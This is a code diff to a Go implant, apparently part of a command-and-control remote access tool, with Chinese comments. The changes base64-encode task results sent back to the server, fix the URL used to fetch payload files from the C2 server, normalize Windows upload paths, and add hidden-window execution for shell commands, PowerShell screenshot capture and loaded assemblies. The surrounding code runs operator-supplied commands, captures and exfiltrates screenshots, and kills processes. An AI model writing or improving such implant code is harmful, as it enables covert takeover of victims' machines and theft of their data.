@@ -45,6 +45,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf8"
 )
 
 // 编译期注入常量（text/template 替换）
@@ -101,7 +102,9 @@ type TaskReport struct {
 	TaskID     string `json:"task_id"`
 	Success    bool   `json:"success"`
 	Output     string `json:"output,omitempty"`
+	OutputB64  string `json:"output_b64,omitempty"`
 	Error      string `json:"error,omitempty"`
+	ErrorB64   string `json:"error_b64,omitempty"`
 	BlobBase64 string `json:"blob_b64,omitempty"`
 	BlobSuffix string `json:"blob_suffix,omitempty"`
 	StartedAt  int64  `json:"started_at"`
@@ -326,16 +329,7 @@ func handleTaskSyncTCP(conn net.Conn, env TaskEnv) {
 	defer func() { tcpTaskConn = nil }()
 	start := time.Now()
 	output, blobB64, blobSuffix, errMsg := executeTask(env.TaskType, env.Payload)
-	report := TaskReport{
-		TaskID:     env.TaskID,
-		Success:    errMsg == "",
-		Output:     output,
-		Error:      errMsg,
-		BlobBase64: blobB64,
-		BlobSuffix: blobSuffix,
-		StartedAt:  start.UnixMilli(),
-		EndedAt:    time.Now().UnixMilli(),
-	}
+	report := buildTaskReport(env.TaskID, output, errMsg, blobB64, blobSuffix, start, time.Now())
 	tcpReportResult(conn, report)
 }
 
@@ -367,7 +361,8 @@ func fetchC2FileByID(fileID string) ([]byte, error) {
 	if tcpTaskConn != nil {
 		return tcpFetchEncryptedFile(tcpTaskConn, fileID)
 	}
-	url := fmt.Sprintf("%s%s%s.bin", serverURL, filePath, fileID)
+	// 服务端 handleFileServe 会在 downstream/<file_id>.bin 读取；URL 路径应为 /file/<file_id>，勿重复 .bin
+	url := fmt.Sprintf("%s%s%s", serverURL, filePath, fileID)
 	req, _ := http.NewRequest("GET", url, nil)
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("X-Implant-Token", implantToken)
@@ -635,20 +630,39 @@ func decryptGCM(cipherText string) ([]byte, error) {
 	return gcm.Open(nil, nonce, ct, nil)
 }
 
+func encodeReportText(s string) (plain, b64 string) {
+	if s == "" {
+		return "", ""
+	}
+	b := []byte(s)
+	if utf8.Valid(b) {
+		return s, ""
+	}
+	return "", base64.StdEncoding.EncodeToString(b)
+}
+
+func buildTaskReport(taskID, output, errMsg, blobB64, blobSuffix string, start, end time.Time) TaskReport {
+	outText, outB64 := encodeReportText(output)
+	errText, errB64 := encodeReportText(errMsg)
+	return TaskReport{
+		TaskID:     taskID,
+		Success:    errMsg == "",
+		Output:     outText,
+		OutputB64:  outB64,
+		Error:      errText,
+		ErrorB64:   errB64,
+		BlobBase64: blobB64,
+		BlobSuffix: blobSuffix,
+		StartedAt:  start.UnixMilli(),
+		EndedAt:    end.UnixMilli(),
+	}
+}
+
 func handleTaskAsync(env TaskEnv) {
 	defer func() { _ = recover() }()
 	start := time.Now()
 	output, blobB64, blobSuffix, errMsg := executeTask(env.TaskType, env.Payload)
-	report := TaskReport{
-		TaskID:     env.TaskID,
-		Success:    errMsg == "",
-		Output:     output,
-		Error:      errMsg,
-		BlobBase64: blobB64,
-		BlobSuffix: blobSuffix,
-		StartedAt:  start.UnixMilli(),
-		EndedAt:    time.Now().UnixMilli(),
-	}
+	report := buildTaskReport(env.TaskID, output, errMsg, blobB64, blobSuffix, start, time.Now())
 	reportResult(report)
 }
 
@@ -715,6 +729,7 @@ func runWithTimeout(cmdStr string, timeoutSec int) (string, error) {
 		timeoutSec = 60
 	}
 	cmd := exec.Command(shellByOS(), shellFlag(), cmdStr)
+	prepareHiddenCmd(cmd)
 	cwdMu.Lock()
 	cmd.Dir = currentCwd
 	cwdMu.Unlock()
@@ -890,12 +905,26 @@ func taskKillProc(payload map[string]interface{}) (string, string, string, strin
 	return "killed", "", "", ""
 }
 
+func normalizeRemotePath(p string) string {
+	p = strings.TrimSpace(p)
+	if p == "" || runtime.GOOS != "windows" {
+		return p
+	}
+	// 控制台可能下发 /d:/path/file（Unix 风格），Windows 需转为 d:\path\file
+	p = strings.ReplaceAll(p, "\\", "/")
+	if len(p) >= 3 && p[0] == '/' && p[2] == ':' {
+		p = p[1:]
+	}
+	return filepath.FromSlash(p)
+}
+
 func taskUpload(payload map[string]interface{}) (string, string, string, string) {
 	remotePath, _ := payload["remote_path"].(string)
 	fileID, _ := payload["file_id"].(string)
 	if remotePath == "" || fileID == "" {
 		return "", "", "", "remote_path or file_id empty"
 	}
+	remotePath = normalizeRemotePath(remotePath)
 	data, err := fetchC2FileByID(fileID)
 	if err != nil {
 		return "", "", "", err.Error()
@@ -931,7 +960,7 @@ func taskScreenshot() (string, string, string, string) {
 		b64Out, err = runWithTimeout("import -window root /tmp/.cs_ss.png 2>/dev/null && base64 /tmp/.cs_ss.png && rm -f /tmp/.cs_ss.png", 30)
 	case "windows":
 		ps := `Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location,[System.Drawing.Point]::Empty,$b.Size); $m=New-Object IO.MemoryStream; $b.Save($m,[System.Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($m.ToArray())`
-		b64Out, err = runWithTimeout(fmt.Sprintf("powershell -NoProfile -NonInteractive -Command \"%s\"", ps), 30)
+		b64Out, err = runWithTimeout(fmt.Sprintf("powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\"", ps), 30)
 	default:
 		return "", "", "", "screenshot not supported on " + runtime.GOOS
 	}
@@ -1172,6 +1201,7 @@ func taskLoadAssembly(payload map[string]interface{}) (string, string, string, s
 		cmdArgs = strings.Fields(args)
 	}
 	cmd := exec.Command(tmpFile, cmdArgs...)
+	prepareHiddenCmd(cmd)
 	cwdMu.Lock()
 	cmd.Dir = currentCwd
 	cwdMu.Unlock()
